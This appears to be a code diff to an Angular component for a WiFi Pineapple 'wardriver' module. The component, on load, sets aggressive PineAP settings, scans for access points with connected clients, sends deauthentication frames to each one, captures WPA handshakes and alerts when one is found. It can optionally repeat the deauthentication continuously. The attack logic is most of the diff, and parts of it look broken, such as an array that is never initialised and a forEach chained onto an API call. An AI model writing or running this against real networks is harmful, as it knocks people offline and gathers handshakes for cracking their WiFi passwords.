@@ -1,6 +1,7 @@
 import { Component, OnInit } from '@angular/core'; 
 import { ApiService } from '../services/api.service'; 
-import { StatusRootObject, Header, Message } from '../interfaces/status.interface';
+import { StatusRootObject} from '../interfaces/status.interface';
+import { APResult } from '../interfaces/reconresult.interface';
 
 @Component({ 
     selector: 'lib-wardriver', 
@@ -14,11 +15,8 @@ export class WarDriverComponent implements OnInit {
     statusHeader: string = '';
     statusFileName: string = '';
     json_frontend: StatusRootObject;
-
-    async delay(ms: number) {
-        await new Promise(resolve => setTimeout(()=>resolve(ms), ms)).then(()=>console.log("fired"));
-    }
-
+    continousDeauth: boolean = false;
+    
     populateTargetBSSIDs(): void {
         this.API.APIGet('/api/pineap/ssids', (resp) => {
             this.apiResponse = resp.ssids;
@@ -52,9 +50,64 @@ export class WarDriverComponent implements OnInit {
         this.get_status_file(statusFileName);
         //this.render_status();
     }
+    attackd(scanResultsArray: APResult[]): void {
+        this.API.APIGet('/api/pineap/handshakes', (resp) => {  // start handshake capture
+            if (resp.handshakes != null) {
+                scanResultsArray.forEach(ap => { // loop through APs
+                    let ap_deauth_payload = { // build ap deauth payload
+                        bssid: ap.bssid,
+                        multiplier: 1,
+                        channel: 11,
+                        clients: [] // ??  "clients": string[] | https://hak5.github.io/mk7-docs/docs/rest/pineap/pineap/
+                    }
+                    this.API.APIPost('/api/pineap/deauth/ap', ap_deauth_payload, (resp) => {  // deauth the ap
+                        console.log('>ap deauthd: ' +ap.bssid)
+                    }).forEach(client => { // loop through clients
+                        let client_deauth_payload = { // build client deauth payload
+                            bssid: ap.bssid,
+                            mac: client.client_mac,
+                            multiplier: 1,
+                            channel: 11
+                        }
+                        this.API.APIPost('/api/pineap/deauth/client', client_deauth_payload, (resp) => { // deauth a client
+                            console.log('>deauthd: ' +client.client_mac);
+                        });
+                    });
+                });
+            }
+        });
+        console.log('>cooling down breifly, waiting for straggling handshakes');
+        setTimeout(() => {
+            this.API.APIPost('/api/pineap/handshakes/stop', null, (resp) => { // stop handshake capture
+                console.log('>stopped handshake capture');
+                this.API.APIGet('/api/pineap/handshakes', (resp) => {
+                    if (resp.handshakes.length > 0) {
+                        console.log('>handshakes found!');
+                        const notification_payload = {
+                            level: 1,
+                            message: "HANDSHAKE FOUND!!!",
+                            module_name: 'wardriver'
+                        }
+                        this.API.APIPut('/api/notifications', notification_payload, (resp) => {} );
+                    }
+                    else { console.log('>no handshakes found :('); }
+                    }
+                )
+            });
+        }, 20000);    
+        if (this.continousDeauth) {
+            this.attackd(scanResultsArray);
+        }
+    }
+    
+    run_scand(): void {
+        const scan_opts = {
+            "live":false,
+            "scan_time":30,
+            "band":"0"
+        };
 
-    set_aggro(): void {
-        let pineAP_aggro_settings = {
+        const pineAP_aggro_settings = {
             'mode': 'advanced', 
             'settings': { 
                 'ap_channel': '11', 
@@ -74,38 +127,40 @@ export class WarDriverComponent implements OnInit {
                 'target_mac': 'FF:FF:FF:FF:FF:FF' 
             }
         }
+        let scanResultsArray: Array<APResult>;
+
         this.API.APIPut('/api/pineap/settings', pineAP_aggro_settings, (resp) => {
-            console.log(pineAP_aggro_settings);
-            console.log(resp);
+            this.API.APIPost('/api/recon/stop', null, (resp) => {
+                this.API.APIPost('/api/recon/start', scan_opts, (resp) => {
+                    // notify end user of 30 second wait
+                    setTimeout(() => {  
+                    this.API.APIGet('/api/recon/scans/' + resp.scanID, (resp) => {
+                        console.log('>apr len: ' +resp.APResults.length);
+                        if (resp.APResults.length > 0) {
+                            resp.APResults.forEach(ap => {
+                                if (ap.clients != null) {
+                                    ap.clients.forEach(client => {
+                                        console.log('>client found!: ' + client.client_mac);
+                                        scanResultsArray.push(ap);
+                                    });
+                                }
+                                else { console.log('>AP found, but not with associated clients'); }
+                            });
+                        }
+                        else { console.log('>no APs found'); }
+                        
+                        this.API.APIPost('/api/recon/stop', null, (resp) => { 
+                            if (scanResultsArray != null) this.attackd(scanResultsArray);
+                            else console.log('>sorry, nothing to attack');
+                        });
+                    })}, 120000);
+            });
         });
-    }
-
-    run_scand(): void {
-        this.set_aggro();
-        // stop active scans
-        this.API.APIPost('/api/recon/stop', null , (resp) => {
-            console.log('>active scans stopped');
-            console.log(resp.error);
-        });
-        const scan_opts = {
-            "live":false,
-            "scan_time":30,
-            "band":"0"
-    };
-        this.API.APIPost('/api/recon/start', scan_opts, (resp) => {
-            console.log('>starting recon scan:');
-            console.log(resp.error);
-        });
-
-        this.API.setBusy();
-        this.delay(30000).then(any=>{
-            this.API.setNotBusy();
-            console.log('>no longer busy');
-       });  
-    }
+    });    
+}
 
     ngOnInit() { 
-        this.populateTargetBSSIDs();
+        //this.populateTargetBSSIDs();
         //this.get_status();
         this.run_scand();
     } 
